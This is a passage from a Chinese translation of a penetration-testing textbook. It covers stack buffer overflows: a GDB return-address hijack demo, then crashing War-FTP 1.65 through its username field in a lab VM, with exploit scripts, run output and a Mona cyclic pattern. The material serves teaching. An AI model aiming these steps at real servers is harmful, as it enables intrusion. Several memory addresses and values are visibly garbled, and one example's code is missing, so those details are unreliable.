  \n回到我们的调试器，如果我们能在内存中找到 `overflowed` 的起始地址，我们就能将那四个 `B` 替换为该内存地址，覆盖返回地址，并强制程序执行开发者无意让其执行的指令。我们拥有源代码，并且知道要找的函数名，所以这个任务是轻而易举的。让我们反汇编\
  \ `overflowed` 并找到它被加载到内存中的位置，如示例 16-14 所示。\n\n### 示例 16-14. 反汇编 `overflowed`\n\n\
  ```\n (gdb) disass overflowed\n  Dump of assembler code for function overflowed:\n\
  ❶ 0x080483f4 <overflowed+0>:     push   %ebp\n  0x080483f5 <overflowed+1>:     mov\
  \    %esp,%ebp\n  0x080483f7 <overflowed+3>:     sub    $0x8,%esp\n  0x080483fa\
  \ <overflowed+6>:     movl   $0x8048520,(%esp)\n  0x08048401 <overflowed+13>:  \
  \  call   0x804832c <puts@plt>\n  0x08048406 <overflowed+18>:    leave\n  0x08048407\
  \ <overflowed+19>:    ret\n  End of assembler dump.\n  (gdb)\n```\n\n如你所见，内存地址 `0x80483f4`\
  \ ❶ 持有 `overflowed` 的条指令。如果我们将程序重定向到这里，它将执行该函数中的所有指令。\n\n### 注意\n\n这并不会给我们提供反向 shell，也不会将目标主机加入僵尸网络；它只会在屏幕上打印“Execution\
  \ Hijacked”。在接下来的三个章节的漏洞开发示例中，我们将看到更多精彩的执行劫持。\n\n我们可以使用 `perl` 来帮助创建参数字符串，其中将包含用于覆盖返回地址的内存地址的十六进制字节，如下所示。\n\
  \n```\n(gdb) run $(perl -e 'print \"A\" x 9 . \"\\x08\\x04\\x83\\xf4\"')\nStarting\
  \ program: /home/georgia/overflowtest $(perl -e 'print \"A\" x 9 . \"\\x08\\x04\\\
  x83\\xf4\"')\n```\n\n这一次，我们将那四个 `B` 替换为 `\\x08\\x04\\x83\\xf4`，这应该将执行重定向到 `overflowed`\
  \ 的开头。但结果并不如计划所示，如示例 16-15 所示。\n\n### 示例 16-15. 返回地址字节被翻转了。\n\n```\nBreakpoint 3,\
  \ function (str=0xbffff700 \"\\017\") at overflowtest.c:11\n11    }\n(gdb) x/16xw\
  \ $esp\n0xbffff510:    0xbffff523    0xbffff744    0xbffff528    0x080482e8\n0xbffff520:\
  \    0x41fcfff4    0x41414141    0x41414141    0xf4830408\n0xbffff530:    0xbffff700\
  \    0xbffff550    0xbffff5a8    0xb7e8c85\n0xbffff540:    0x08048470    0x08048340\
  \    0xbffff5a8    0xb7e8c85\n(gdb) continue\nContinuing.\nProgram received signal\
  \ SIGSEGV, Segmentation fault.\n0xf483048 in ??\n```\n\n如你所见，我们如预期地命中了断点，但当我们检查内存时，似乎遇到了一小问题。`overflowed`\
  \ 第一条指令的内存地址是 `0x80483f4`，但我们栈上的返回地址是 `0xf483040` ❶。数字并没有完全反转，但字节顺序是错误的。\n\n\n\n\
  现在你已经看到了一个基于栈的溢出的基本示例，让我们进入稍微复杂一点的内容。在下一章中，我们的示例将侧重于基于 Windows 的目标和一个真实的目标程序。\n\n\
  # 第 17 章 Windows 中的基于栈的缓冲区溢出\n\n在本章中，我们将利用一个旧版本 Windows FTP 服务器的基于栈的缓冲区溢出。正如我们在第\
  \ 16 章 中做的那样，我们将尝试重写函数被调用时保存在栈上的返回指针，这在之前的图 16-3 中所示。当函数 `main` 调用 `function1` 时，下一条要执行的指令会被保存在栈中，并为\
  \ `function1` 在栈上添加一个栈帧。\n\n`function1` 局部变量的大小在应用程序编译并固定时就已经确定了。栈上为这些局部变量“预留”的空间也是固定的。这种预留被称为`栈缓冲区`（stack\
  \ buffer）。如果我们向栈缓冲区中放入的数据超过了能容纳的内容，就会导致缓冲区溢出。然后，我们可能会重写放在栈缓冲区之后的保存返回地址，并接管程序的执行。（有关此过程的更详细回顾，请参阅第\
  \ 16 章。）\n\n在第 1 章中，我们在 Windows XP 目标上安装了 War-FTP 1.65 版本，但我们并没有启动它。我们在之前的章节中利用过\
  \ FileZilla FTP 服务器，如果你一直在跟进，那个 FTP 服务器仍然仍在运行。在使用 War-FTP 之前，我们需要使用 XAMPP 控制面板停止\
  \ FileZilla FTP 服务器。这将为 War-FTP 开启 TCP 端口 21。在 Windows XP 桌面上双击图标打开 War-FTP（参见图\
  \ 17-1），并点击 War-FTP 窗口左角的闪电图标使其上线（参见图 17-2）。\n\n![War-FTP icon](img/httpatomoreillycomsourcenostarchimages2030510.png.jpg)图\
  \ 17-1. War-FTP 图标\n\n## 在 War-FTP 中寻找已知漏洞\n\n在 Google 上搜索 War-FTP 1.65 的已知漏洞，在\
  \ *SecurityFocus.com* 上发现了以下信息：\n\n> War-FTP 用户名基于栈的缓冲区溢出漏洞\n\n> War-FTP 容易受到基于栈的缓冲区溢出漏洞的影响，因为它在将用户提供的数据复制到大小不足的缓冲区之前，未能对该数据进行适当的边界检查。\n\
  \n> 利用此问题可能会导致拒绝服务状态，并在应用程序的上下文中执行任意机器代码。\n\n在第 16 章中，我们通过提供的输入溢出了栈上的函数局部变量，并将执行流重定向到我们选择的内存位置。根据来自\
  \ *SecurityFocus.com* 的这些信息，看起来我们可以对 War-FTP 1.65 执行类似的操作。在本章中，我们将手动利用 War-FTP 1.65\
  \ 在 FTP 登录用户名字段中的基于栈的缓冲区溢出漏洞。由于我们现在使用的是真实程序而不是演示代码，我们将学习更多关于编写真实利用程序的知识。例如，这次我们无法简单地将执行重定向到另一个函数；相反，我们需要引入作为攻击字符串一部分执行的指令。\n\
  \n开始之前，确保 War-FTP 1.65 已经在你的 Win-d XP 虚拟机上打开并运行。（图 17-2 中所示的 GUI 左上角的闪电图标告诉服务器监听传入的连接。）\n\
  \n我们要利用的这个问题特别危险，因为攻击者在发起攻击之前不需要登录 FTP 服务器。因此，我们不需要为 FTP 服务器添加任何合法用户即可让此攻击生效。\n\n\
  在我们深入研究并开始尝试利用 War-FTP 之前，让我们将其挂载到调试器上。Immunity Debugger 应该在你的 Windows XP 目标桌面上，因为我们在第\
  \ 1 章中安装了它。如果没有，请按照第 1 章中的指令设置 Immunity Debugger 和 Mona 插件。就像 GDB 一样，Immunity Debugger\
  \ 将允许我们在尝试利用 War-FTP 时查看内存内部。不幸的是，我们没有源代码指导我们成功利用，但通过在发送攻击字符串时观察内存中的程序，我们仍然能够开发出可行的利用程序。\n\
  \n![War-FTP 1.65 GUI](img/httpatomoreillycomsourcenostarchimages2030512.png.jpg)图\
  \ 17-2. War-FTP 1.65 GUI\n\n启动 Immunity Debugger，打开 **File** 菜单并选择 **Attach**。我们将\
  \ Immunity Debugger 挂载到运行中的 War-FTP 进程，在图 17-3 中可以看到 War-FTP 1.65，点击 **Attach**。\n\
  \n![Process list in Immunity Debugger](img/httpatomoreillycomsourcenostarchimages2030514.png.jpg)图\
  \ 17-3. Immunity Debugger 中的进程列表\n\n当 Immunity Debugger 首次挂载到进程时，它会暂停执行。如果利用程序在任何时候停止工作，请检查进程是否正在运行。暂停的进程不会监听传入的连接，正如你在图\
  \ 17-4 窗口右下角所示，点击屏幕左角的 **Play** 按钮让进程继续运行。\n\n![War-FTP pauses in Immunity Debugger.](img/httpatomoreillycomsourcenostarchimages2030516.png.jpg)图\
  \ 17-4. War-FTP 在 Immunity Debugger 中暂停。\n\n在 Immunity Debugger 中运行 War-FTP，我们可以找出如何利用它的缓冲区溢出漏洞。\n\
  \n## 导致\n\n在第 19 章，我们将使用称为`模糊测试`（fuzzing）的技术寻找程序中的潜在漏洞，但现在请按照我的指示使用攻击字符串使程序崩溃。在\
  \ FTP 登录的用户名字段中，让我们发送 1100 个 `A` 字符串而不是用户名。不像上一个示例那样本地攻击程序，这次我们将在 Kali Linux 中创建利用程序，并设置利用程序通过网络与\
  \ FTP 服务器通信。示例 17-1 显示了一个会导致 War-FTP 程序崩溃的启动利用程序。\n\n### 注意\n\n我们的利用程序示例是用 Python\
  \ 编写的，但如果你愿意使用其他语言，可以很容易地移植到其他语言。\n\n示例 17-1. 导致 War-FTP 崩溃\n\n\n\n\n在示例 17-1 所示的利用中，我们首先导入\
  \ `socket` Python 库。接下来，我们创建一个名为 `buffer` 的字符串，其中包含 1,100 个 `A`，并在 ❶ 处设置了一个 socket\
  \ 以连接到我们端口为 21 的 Windows XP 机器，War-FTP 服务器正在该端口监听。接着，我们在 ❷ 处接收并将 FTP 服务器的横幅（banner）打印到屏幕上。然后，我们的利用程序发送了一个带有\
  \ 1,100 个 `A` 的 `USER` 命令 ❸ 作为用户名，希望导致 FTP 服务器崩溃。\n\n如果服务器响应并要求我们输入密码，则利用程序已准备好使用密码\
  \ `PASSWORD` 完成连接。然而，如果我们的漏洞利用成功，那么我们的凭据是否有效就无关了，因为程序在完成登录过程之前就会崩溃。最后，我们关闭 socket，漏洞利用结束。确保\
  \ Python 脚本已通过 `chmod +x` 具有执行权限，并按所示运行利用程序。\n\n```\nroot@kali:~# chmod +x ftpexploit\n\
  root@kali:~# ./ftpexploit\n220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready\n\
  220 Please enter your user name.\n331 User name okay, Need password.\n```\n\n与上一个示例一样，我们希望用一串\
  \ `A` 字符串覆盖保存的返回地址并导致程序崩溃。War-FTP 服务器会发送其欢迎横幅，提示我们输入用户名，然后询问密码。查看 Immunity Debugger\
  \ 中的 War-FTP（如图 17-5），以查看我们的利用程序是否成功导致了崩溃。\n\n![War-FTP crashes due to a buffer\
  \ overflow.](img/httpatomoreillycomsourcenostarchimages2030518.png.jpg)图 17-5. 缓冲区溢出导致\
  \ War-FTP 崩溃。\n\n在我们运行利用程序后，看到 War-FTP 在尝试执行 `41414141` 处的指令时由于访问违规（access violation）而暂停。根据我们在第\
  \ 16 章中学习到的知识，这个结果应该并不陌生。返回地址被我们的长 `A` 字符串覆盖了，因此当函数返回时，`41414141` 被加载到 EIP 寄存器中。程序尝试执行该内存位置的指令，但该位置超出了范围并导致了崩溃。\n\
  \n## 定位 EIP\n\n与上一个示例一样，我们需要知道字符串中的四个 `A` 覆盖了返回地址。遗憾的是，1,100 个 `A` 比我们在上一章中使用的 30\
  \ 个要多，因此在这种情况下，仅在内存中计数要困难得多。此外，我们无法确定在栈上看到的第一个 `A` 是否是作为利用程序的一部分发送出去的首个 `A`。\n\n\
  传统的做法是再次使用 550 个 `A` 导致程序再次崩溃。如果程序崩溃时 EIP 中为 `41414141`，则返回地址覆盖发生在前 550 字节中；如果崩溃时\
  \ EIP 中为 `424242`，则覆盖发生在后半部分。从那里开始，问题字符串的一半将被分为 275 个 `A` 后跟 275 个 `B`。通过这种方法可以缓慢但确定地缩小精确位置。\n\
  \n## 生成循环模式\n\n幸运的是，我们可以使用 `Mona` 生成一个唯一的模式，以便在一次迭代中找到用于返回地址的正确四个字节。要使用 `Mona` 完成此任务，在\
  \ Immunity Debugger 窗口底部输入长度为 `1100` 的 `pattern_create`，如图 17-6 所示。\n\n![Using pattern_create\
  \ in](img/httpatomoreillycomsourcenostarchimages2030520.jpg)\n\n1100 个字符的循环模式被写入文件\
  \ `C:\\logs\\war-ftpd\\pattern.txt`，如示例 17-2 所示。\n\n```\n=============================================================\n\
  Output by mona.py v2.0, rev 451 - Immunity Debugger\nCorelan Team - https://www.corelan.be\n\
  =============================================================\nOS : xp, release\
  \ 5.1.2600\nProcess being debugged : war-ftpd (pid 2416)\n=============================================================\n\
  2015-11-10:32\n=============================================================\nPattern\
  \ of 1100 bytes :\n-----------------------\\n\
  ```\n\n\n\n\n\n```python\nroot@kali:~# cat ftpexploit\n  #!/usr/bin/python\n  import\
  \ socket\n  ❶ buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\n\
  \  Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8\n\
